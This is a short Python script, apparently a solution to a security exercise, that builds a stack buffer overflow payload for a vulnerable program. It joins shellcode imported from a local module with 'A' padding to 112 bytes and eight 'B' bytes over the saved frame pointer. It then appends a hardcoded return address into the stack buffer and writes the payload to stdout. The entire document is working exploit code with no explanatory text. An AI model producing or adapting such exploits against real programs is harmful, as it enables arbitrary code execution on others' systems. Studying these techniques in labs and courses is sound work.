#!/usr/bin/env python3

import sys

from shellcode import shellcode

payload = shellcode

padding_size = 112 - len(shellcode)
payload += b'A' * padding_size

payload += b'B' * 8
buffer_addr = 0x7ffffff68f60 
payload += buffer_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)